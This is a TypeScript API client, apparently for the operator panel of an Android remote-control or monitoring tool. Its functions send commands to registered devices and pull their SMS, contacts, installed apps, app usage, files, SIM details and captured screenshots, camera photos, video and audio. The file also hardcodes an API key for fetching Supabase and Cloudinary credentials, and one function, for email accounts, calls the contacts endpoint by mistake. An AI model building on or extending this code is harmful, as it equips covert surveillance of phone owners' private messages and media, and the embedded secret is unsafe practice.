import axios from 'axios';
import type { Device, SmsLog, SecurityAlert, InstalledApp, FileItem, Contact, Command, MediaItem, SimCardInfo, EmailAccount, AppUsageActivity } from '../types';

let API_BASE = '';
let SUPABASE_KEY = '';

export interface VercelKeys {
  supabase_url: string;
  supabase_key: string;
  cloudinary_cloud_name: string;
  cloudinary_api_key: string;
  cloudinary_secret_key: string;
}

export async function fetchServerUrlFromDb(supabaseUrl: string, supabaseKey: string): Promise<string> {
  try {
    const { data } = await axios.get(`${supabaseUrl}/rest/v1/app_settings`, {
      headers: {
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Content-Type': 'application/json',
      },
      params: { select: '*' },
      timeout: 15000,
    });
    if (Array.isArray(data) && data.length > 0) {
      if (data.length > 1) {
        cleanupAppSettings(supabaseUrl, supabaseKey, data).catch(() => {});
      }
      return data[0].url_target || data[0].server_url || '';
    }
    if (data && typeof data === 'object' && !Array.isArray(data)) {
      return (data as Record<string, string>).url_target || (data as Record<string, string>).server_url || '';
    }
    return '';
  } catch {
    return '';
  }
}

async function cleanupAppSettings(supabaseUrl: string, supabaseKey: string, rows: Record<string, unknown>[]) {
  const headers = { apikey: supabaseKey, Authorization: `Bearer ${supabaseKey}` };
  const latestId = rows[0]?.id;
  if (!latestId) return;
  for (let i = 1; i < rows.length; i++) {
    const id = rows[i]?.id;
    if (!id || id === latestId) continue;
    try {
      await axios.delete(`${supabaseUrl}/rest/v1/app_settings?id=eq.${id}`, {
        headers: { ...headers, Prefer: 'return=minimal' },
        timeout: 5000,
      });
    } catch { /* ignore */ }
  }
}

export async function fetchKeysFromVercel(): Promise<VercelKeys | null> {
  try {
    const { data } = await axios.get<VercelKeys>('https://app-keys.vercel.app/api/get_keys', {
      headers: {
        'Content-Type': 'application/json',
        'X-API-KEY': 'MySecretAppPassword123',
      },
      timeout: 15000,
    });
    return data;
  } catch {
    return null;
  }
}

export function configureApi(serverUrl: string, supabaseKey: string) {
  API_BASE = serverUrl.replace(/\/+$/, '');
  SUPABASE_KEY = supabaseKey;
}

function headers() {
  const h: Record<string, string> = { 'Content-Type': 'application/json' };
  if (SUPABASE_KEY) h['Authorization'] = `Bearer ${SUPABASE_KEY}`;
  return h;
}

async function get<T>(path: string, params?: Record<string, string>): Promise<T> {
  const { data } = await axios.get(`${API_BASE}${path}`, { headers: headers(), params, timeout: 15000 });
  return data;
}

async function post<T>(path: string, body?: unknown): Promise<T> {
  const { data } = await axios.post(`${API_BASE}${path}`, body, { headers: headers(), timeout: 15000 });
  return data;
}

async function patch<T>(path: string, body?: unknown): Promise<T> {
  const { data } = await axios.patch(`${API_BASE}${path}`, body, { headers: headers(), timeout: 15000 });
  return data;
}

async function del<T>(path: string): Promise<T> {
  const { data } = await axios.delete(`${API_BASE}${path}`, { headers: headers(), timeout: 15000 });
  return data;
}

export async function testConnection(): Promise<boolean> {
  try {
    await get('/api/devices');
    return true;
  } catch {
    return false;
  }
}

export async function fetchDevices(): Promise<Device[]> {
  const raw = await get<Record<string, unknown>[]>('/api/devices');
  return raw.map((d) => ({
    id: String(d.id || ''),
    name: String(d.device_name || d.name || ''),
    token: String(d.token || d.id || ''),
    battery: Number(d.battery || 0),
    lastActive: String(d.last_updated || d.last_active || ''),
    storageUsed: Number(d.storage_used || 0),
    storageTotal: Number(d.storage_total || 0),
    isLocked: Boolean(d.is_locked),
    networkType: String(d.net_type || d.networkType || ''),
    carrierName: String(d.net_name || d.carrierName || ''),
    isCharging: Boolean(d.is_charging),
    isOnline: Boolean(d.isOnline),
    androidVersion: String(d.android_version || d.androidVersion || ''),
    status: String(d.status || ''),
  }));
}

export async function addDevice(token: string, name: string): Promise<unknown> {
  return post('/api/device', { token, name });
}

export async function updateDevice(token: string, body: Partial<Device>): Promise<unknown> {
  return patch(`/api/device/${token}`, body);
}

export async function sendCommand(token: string, command: string, params?: Record<string, unknown>): Promise<unknown> {
  return post('/api/commands', { device_token: token, command, ...params });
}

export async function fetchCommands(token: string): Promise<Command[]> {
  return get('/api/commands', { token });
}

export async function fetchCommandResponses(token: string): Promise<Command[]> {
  return get('/api/command_responses', { device_token: token });
}

export async function fetchSms(token: string): Promise<SmsLog[]> {
  return get('/api/device_sms', { device_id: token });
}

export async function fetchSecurityAlerts(token: string): Promise<SecurityAlert[]> {
  return get('/api/security_alerts', { device_token: token });
}

export async function deleteSecurityAlerts(token: string): Promise<unknown> {
  return del(`/api/security_alerts/${token}`);
}

export async function fetchInstalledApps(token: string): Promise<InstalledApp[]> {
  return get('/api/list_apps', { device_id: token });
}

export async function fetchAppUsage(token: string): Promise<AppUsageActivity[]> {
  return get('/api/app_usage', { device_id: token });
}

export async function fetchFiles(token: string): Promise<FileItem[]> {
  return get('/api/files', { device_token: token });
}

export async function fetchContacts(token: string): Promise<Contact[]> {
  return get('/api/device_contacts', { device_id: token });
}

export async function fetchSimCards(token: string): Promise<SimCardInfo[]> {
  return get('/api/phone_number', { device_id: token });
}

export async function fetchEmailAccounts(token: string): Promise<EmailAccount[]> {
  return get('/api/device_contacts', { device_id: token });
}

export async function fetchMediaFiles(token: string, types?: string[]): Promise<MediaItem[]> {
  const params: Record<string, string> = { token };
  if (types) params.file_type = types.join(',');
  const raw = await get<Record<string, unknown>[]>('/api/media_files', params);
  return raw.map((d) => ({
    id: String(d.id || ''),
    url: String(d.file_url || d.url || ''),
    timestamp: String(d.created_at || d.timestamp || ''),
    type: mapFileType(d.file_type, d.command_source),
    commandSource: String(d.command_source || ''),
  }));
}

function mapFileType(fileType: unknown, commandSource?: unknown): MediaItem['type'] {
  const ct = String(commandSource || '').toLowerCase();
  const ft = String(fileType || '').toLowerCase();

  if (ct.includes('screenshot') || ct.includes('لقطة شاشة')) return 'screenshot';
  if (ct.includes('photo') || ct.includes('camera') || ct.includes('صورة') || ct.includes('كاميرا')) return 'photo';
  if (ct.includes('video') || ct.includes('فيديو') || ct.includes('فيديو')) return 'video';
  if (ct.includes('audio') || ct.includes('صوتي') || ct.includes('تسجيل صوتي')) return 'audio';

  if (ft === 'screenshot') return 'screenshot';
  if (ft === 'photo' || ft === 'image') return 'photo';
  if (ft === 'video') return 'video';
  if (ft === 'audio') return 'audio';
  return 'photo';
}

export async function deleteMediaFile(id: string): Promise<unknown> {
  return del(`/api/media_files/${id}`);
}
